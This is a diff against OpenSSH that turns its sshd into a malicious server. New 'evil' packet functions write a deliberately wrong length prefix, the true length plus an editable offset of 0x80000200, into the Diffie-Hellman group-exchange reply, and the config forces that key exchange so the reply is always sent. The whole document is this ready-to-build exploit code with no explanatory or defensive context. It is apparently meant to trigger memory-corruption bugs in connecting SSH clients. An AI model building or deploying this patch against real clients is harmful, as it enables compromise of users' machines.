@@ -1,0 +1,141 @@
+diff --git a/kexgexs.c b/kexgexs.c
+index 8ee3aacc..8f37c421 100644
+--- a/kexgexs.c
++++ b/kexgexs.c
+@@ -106,8 +106,8 @@ input_kex_dh_gex_request(int type, u_int32_t seq, struct ssh *ssh)
+ 	debug("SSH2_MSG_KEX_DH_GEX_GROUP sent");
+ 	DH_get0_pqg(kex->dh, &dh_p, NULL, &dh_g);
+ 	if ((r = sshpkt_start(ssh, SSH2_MSG_KEX_DH_GEX_GROUP)) != 0 ||
+-	    (r = sshpkt_put_bignum2(ssh, dh_p)) != 0 ||
+-	    (r = sshpkt_put_bignum2(ssh, dh_g)) != 0 ||
++	    (r = sshpkt_put_bignum2_evil(ssh, dh_p)) != 0 ||
++	    (r = sshpkt_put_bignum2_evil(ssh, dh_g)) != 0 ||
+ 	    (r = sshpkt_send(ssh)) != 0)
+ 		goto out;
+ 
+diff --git a/packet.c b/packet.c
+index 36e352b4..e4a1a06b 100644
+--- a/packet.c
++++ b/packet.c
+@@ -2506,6 +2506,12 @@ sshpkt_put_bignum2(struct ssh *ssh, const BIGNUM *v)
+ {
+ 	return sshbuf_put_bignum2(ssh->state->outgoing_packet, v);
+ }
++
++int
++sshpkt_put_bignum2_evil(struct ssh *ssh, const BIGNUM *v)
++{
++	return sshbuf_put_bignum2_evil(ssh->state->outgoing_packet, v);
++}
+ #endif /* WITH_OPENSSL */
+ 
+ /* fetch data from the incoming packet */
+diff --git a/packet.h b/packet.h
+index 0dfa36da..93ea6c77 100644
+--- a/packet.h
++++ b/packet.h
+@@ -190,6 +190,7 @@ int	sshpkt_put_cstring(struct ssh *ssh, const void *v);
+ int	sshpkt_put_stringb(struct ssh *ssh, const struct sshbuf *v);
+ int	sshpkt_put_ec(struct ssh *ssh, const EC_POINT *v, const EC_GROUP *g);
+ int	sshpkt_put_bignum2(struct ssh *ssh, const BIGNUM *v);
++int	sshpkt_put_bignum2_evil(struct ssh *ssh, const BIGNUM *v);
+ 
+ int	sshpkt_get(struct ssh *ssh, void *valp, size_t len);
+ int	sshpkt_get_u8(struct ssh *ssh, u_char *valp);
+diff --git a/sshbuf-getput-basic.c b/sshbuf-getput-basic.c
+index 50648258..34ec3be5 100644
+--- a/sshbuf-getput-basic.c
++++ b/sshbuf-getput-basic.c
+@@ -362,6 +362,26 @@ sshbuf_put_string(struct sshbuf *buf, const void *v, size_t len)
+ 	return 0;
+ }
+ 
++const size_t evil_offset = 0x80000200; // Edit evil offset here
++
++int
++sshbuf_put_string_evil(struct sshbuf *buf, const void *v, size_t len)
++{
++	u_char *d;
++	int r;
++
++	if (len > SSHBUF_SIZE_MAX - 4) {
++		SSHBUF_DBG(("SSH_ERR_NO_BUFFER_SPACE"));
++		return SSH_ERR_NO_BUFFER_SPACE;
++	}
++	if ((r = sshbuf_reserve(buf, len + 4, &d)) < 0)
++		return r;
++	POKE_U32(d, len + evil_offset);
++	if (len != 0)
++		memcpy(d + 4, v, len);
++	return 0;
++}
++
+ int
+ sshbuf_put_cstring(struct sshbuf *buf, const char *v)
+ {
+diff --git a/sshbuf-getput-crypto.c b/sshbuf-getput-crypto.c
+index 3dd1e144..cbf3977f 100644
+--- a/sshbuf-getput-crypto.c
++++ b/sshbuf-getput-crypto.c
+@@ -148,6 +148,28 @@ sshbuf_put_bignum2(struct sshbuf *buf, const BIGNUM *v)
+ 	return 0;
+ }
+ 
++int
++sshbuf_put_bignum2_evil(struct sshbuf *buf, const BIGNUM *v)
++{
++	u_char d[SSHBUF_MAX_BIGNUM + 1];
++	int len = BN_num_bytes(v), prepend = 0, r;
++
++	if (len < 0 || len > SSHBUF_MAX_BIGNUM)
++		return SSH_ERR_INVALID_ARGUMENT;
++	*d = '\0';
++	if (BN_bn2bin(v, d + 1) != len)
++		return SSH_ERR_INTERNAL_ERROR; /* Shouldn't happen */
++	/* If MSB is set, prepend a \0 */
++	if (len > 0 && (d[1] & 0x80) != 0)
++		prepend = 1;
++	if ((r = sshbuf_put_string_evil(buf, d + 1 - prepend, len + prepend)) < 0) {
++		explicit_bzero(d, sizeof(d));
++		return r;
++	}
++	explicit_bzero(d, sizeof(d));
++	return 0;
++}
++
+ #ifdef OPENSSL_HAS_ECC
+ int
+ sshbuf_put_ec(struct sshbuf *buf, const EC_POINT *v, const EC_GROUP *g)
+diff --git a/sshbuf.h b/sshbuf.h
+index 7900b82b..f8632bcb 100644
+--- a/sshbuf.h
++++ b/sshbuf.h
+@@ -185,6 +185,7 @@ int	sshbuf_get_string(struct sshbuf *buf, u_char **valp, size_t *lenp);
+ int	sshbuf_get_cstring(struct sshbuf *buf, char **valp, size_t *lenp);
+ int	sshbuf_get_stringb(struct sshbuf *buf, struct sshbuf *v);
+ int	sshbuf_put_string(struct sshbuf *buf, const void *v, size_t len);
++int	sshbuf_put_string_evil(struct sshbuf *buf, const void *v, size_t len);
+ int	sshbuf_put_cstring(struct sshbuf *buf, const char *v);
+ int	sshbuf_put_stringb(struct sshbuf *buf, const struct sshbuf *v);
+ 
+@@ -214,6 +215,7 @@ int	sshbuf_get_bignum2_bytes_direct(struct sshbuf *buf,
+ #ifdef WITH_OPENSSL
+ int	sshbuf_get_bignum2(struct sshbuf *buf, BIGNUM **valp);
+ int	sshbuf_put_bignum2(struct sshbuf *buf, const BIGNUM *v);
++int	sshbuf_put_bignum2_evil(struct sshbuf *buf, const BIGNUM *v);
+ # ifdef OPENSSL_HAS_ECC
+ int	sshbuf_get_ec(struct sshbuf *buf, EC_POINT *v, const EC_GROUP *g);
+ int	sshbuf_get_eckey(struct sshbuf *buf, EC_KEY *v);
+diff --git a/sshd_config b/sshd_config
+index 19b7c91a..82a08747 100644
+--- a/sshd_config
++++ b/sshd_config
+@@ -102,6 +102,8 @@ AuthorizedKeysFile	.ssh/authorized_keys
+ #ChrootDirectory none
+ #VersionAddendum none
+ 
++KexAlgorithms diffie-hellman-group-exchange-sha256
++
+ # no default banner path
+ #Banner none
+ 
